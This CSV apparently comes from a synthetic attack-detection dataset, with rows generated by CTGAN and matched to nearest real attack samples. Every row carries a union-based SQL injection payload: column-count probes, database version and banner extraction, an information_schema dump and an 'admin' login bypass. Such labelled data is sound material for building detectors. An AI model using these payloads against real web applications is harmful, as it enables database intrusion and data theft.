id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000424,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,8.117358751657328
CTGAN_000425,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,5.599523227396445
CTGAN_000426,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,5.208264085792317
CTGAN_000427,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,5.321504468358434
CTGAN_000428,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000001,6.909401655405783
CTGAN_000429,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,5.666987093417969
CTGAN_000430,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000012,6.982503256362294
CTGAN_000431,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000005,9.521286309850735
CTGAN_000432,attack,union,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000002,9.605563714052256
CTGAN_000433,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,5.4173256294191185
CTGAN_000434,attack,union,"-1876'||  (  select 'itfc' from dual where 9584  =  9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",nearest_attack_euclidean,R000026,6.862256669977751
CTGAN_000435,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,7.886812287797845
CTGAN_000436,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000012,6.744052193599426
CTGAN_000437,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000030,5.56038171682543
CTGAN_000438,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,7.516227735093559
CTGAN_000439,attack,union,"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",nearest_attack_euclidean,R000024,6.67478199523132
CTGAN_000440,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,8.442605376070956
CTGAN_000441,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,7.456816405152165
CTGAN_000442,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,7.319553359885158
CTGAN_000443,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,8.376595057533754
CTGAN_000444,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000015,5.289549973293362
CTGAN_000445,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,9.886909759733905
CTGAN_000446,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,7.008697939664735
CTGAN_000447,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,6.092220165096838
CTGAN_000448,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,7.82609882157443
CTGAN_000449,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,7.049027357950221
CTGAN_000450,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,7.945886841629536
CTGAN_000451,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000022,8.595515310792775
CTGAN_000452,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,7.180793188465425
CTGAN_000453,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000030,7.811389234172618
CTGAN_000454,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,7.358932369527563
CTGAN_000455,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,5.893924218382004
CTGAN_000456,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000028,7.381577835933709
CTGAN_000457,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000028,5.989467581683518
CTGAN_000458,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,5.927913583266143
CTGAN_000459,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000015,5.953673639225226
CTGAN_000460,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,6.61765786866874
CTGAN_000461,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,6.723303475686336
CTGAN_000462,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,6.171501989238088
CTGAN_000463,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000030,6.370353343025088
CTGAN_000464,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,7.164417389725129
CTGAN_000465,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,7.922135035024178
CTGAN_000466,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,6.254414793842933
CTGAN_000467,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000015,6.371047302905931
CTGAN_000468,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,11.910334535417517
CTGAN_000469,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,8.536609469342023
CTGAN_000470,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,6.9715822361538375
CTGAN_000471,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,7.680847065694557
CTGAN_000472,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000028,7.461459826465398
CTGAN_000473,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,8.208909649229923
CTGAN_000474,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000030,8.586541747190617
CTGAN_000475,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,5.954987404360345
CTGAN_000476,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,7.878556982741638
CTGAN_000477,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,12.07329514218577
CTGAN_000478,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,9.504485529083874
CTGAN_000479,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,7.202612736410731
CTGAN_000480,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,5.658132761222737
CTGAN_000481,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,9.23824966015573
CTGAN_000482,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000010,9.187666301944736
CTGAN_000483,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,5.40445360042601
CTGAN_000484,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,6.053498110610276
CTGAN_000485,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,7.925550647873737
CTGAN_000486,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,7.512749751429738
CTGAN_000487,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,5.129024954705881
CTGAN_000488,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,6.937206506791786
CTGAN_000489,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000012,7.3889021590894535
CTGAN_000490,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,5.478775195193312
CTGAN_000491,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,9.557230395621405
CTGAN_000492,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,9.657708040611821
CTGAN_000493,attack,union," )   union select * from information_schema.tables,",nearest_attack_euclidean,R000008,9.536695499181372
CTGAN_000494,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,5.193390592016043
CTGAN_000495,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,6.473069604654549
CTGAN_000496,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,6.909514735305924
CTGAN_000497,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000015,5.6694842787798
CTGAN_000498,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000019,6.318596637250927
CTGAN_000499,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,8.832734896411974
CTGAN_000500,attack,union," )   union select * from information_schema.tables,",nearest_attack_euclidean,R000008,7.513437858060096
CTGAN_000501,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,6.543611627871774
CTGAN_000502,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,9.482587622020494
CTGAN_000503,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,10.681426628651272
CTGAN_000504,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,9.727222014105843
CTGAN_000505,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,8.86218993679014
CTGAN_000506,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,10.416472463979131
CTGAN_000507,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000010,8.631377885295466
CTGAN_000508,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,11.281938093901234
CTGAN_000509,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000019,5.089594456737641
CTGAN_000510,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000019,5.799351930831232
CTGAN_000511,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,7.987716454397972
CTGAN_000512,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,6.005070703030439
CTGAN_000513,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000028,13.12179363248847
CTGAN_000514,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,5.492816917834658
CTGAN_000515,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,6.208462614741082
CTGAN_000516,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,7.4022288335264745
CTGAN_000517,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,6.547400149072423
CTGAN_000518,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,6.609995539534754
CTGAN_000519,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,9.724880454203033
CTGAN_000520,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,9.665308497580504
CTGAN_000521,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,6.733235431474977
CTGAN_000522,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,5.436645148875972
CTGAN_000523,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,6.558588473760529
CTGAN_000524,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,7.1398523041711375
CTGAN_000525,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000028,7.5359066555400895
CTGAN_000526,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000019,5.114956095969468
CTGAN_000527,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,8.83132881698965
CTGAN_000528,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,10.079493439129598
CTGAN_000529,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,6.207284584371427
CTGAN_000530,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,8.373445282782068
CTGAN_000531,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,8.248213602327908
CTGAN_000532,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,5.359727279411019
CTGAN_000533,attack,union,"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",nearest_attack_euclidean,R000024,7.140113886685533
CTGAN_000534,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,7.247380346271006
CTGAN_000535,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,9.565947538941465
CTGAN_000536,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,6.440601818726375
CTGAN_000537,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,6.126104019299968
CTGAN_000538,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,7.385975906927148
CTGAN_000539,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,8.499369883429875
CTGAN_000540,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,5.887835428653715
CTGAN_000541,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,9.70810409063771
CTGAN_000542,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000030,8.616475447804042
CTGAN_000543,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,6.138987993312092
CTGAN_000544,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,8.460355052005896
CTGAN_000545,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000015,7.827106697148265
CTGAN_000546,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,6.0173750660728675
CTGAN_000547,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,9.238168577951873
CTGAN_000548,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,14.319765609798672
CTGAN_000549,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,7.325730709449497
CTGAN_000550,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,8.483593928228277
CTGAN_000551,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,8.218598005447936
CTGAN_000552,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,8.206320748642767
CTGAN_000553,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,12.696738828118702
CTGAN_000554,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000012,6.497284957811122
CTGAN_000555,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000022,9.091918478025711
CTGAN_000556,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,7.697626862043432
CTGAN_000557,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,5.217506265033144
CTGAN_000558,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,7.397597226924591
CTGAN_000559,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,6.16158389370706
CTGAN_000560,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,8.89769430932937
CTGAN_000561,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,6.560837389609357
CTGAN_000562,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000001,8.584799753323548
CTGAN_000563,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000010,7.652532197461928
CTGAN_000564,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000030,6.352729077620844
CTGAN_000565,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,7.800173872048212
CTGAN_000566,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000019,8.488922675191303
CTGAN_000567,attack,union,"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",nearest_attack_euclidean,R000024,6.618215558660953
CTGAN_000568,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,7.634762154304686
CTGAN_000569,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000019,6.624144286590855
CTGAN_000570,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,5.896019788888156
CTGAN_000571,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,11.488933990580703
CTGAN_000572,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000019,5.958981788926605
CTGAN_000573,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000019,12.686904882691401
CTGAN_000574,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,8.63446876989233
CTGAN_000575,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,7.315664333082744
CTGAN_000576,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,7.908156044540814
CTGAN_000577,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,9.899772908767796
CTGAN_000578,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000028,6.23019570502588
CTGAN_000579,attack,union,"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",nearest_attack_euclidean,R000014,7.088983345914388
CTGAN_000580,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,6.944341400149402
CTGAN_000581,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R000025,7.113791317478169
CTGAN_000582,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000015,7.311478281452468
CTGAN_000583,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,6.813849080894293
CTGAN_000584,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,6.3015566794800595
CTGAN_000585,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000028,6.249078839090621
CTGAN_000586,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,8.202884251258633
CTGAN_000587,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,6.826075240852418
CTGAN_000588,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,13.167879833643422
CTGAN_000589,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,7.544237997190893
CTGAN_000590,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,8.424896729626843
CTGAN_000591,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,8.706123435854629
CTGAN_000592,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,6.958738210219061
CTGAN_000593,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,7.523298596726922
CTGAN_000594,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000019,7.066671427063102
CTGAN_000595,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,7.09810211137484
CTGAN_000596,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,8.64504587179534
CTGAN_000597,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,4.746223613894782
CTGAN_000598,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,5.93340906826313
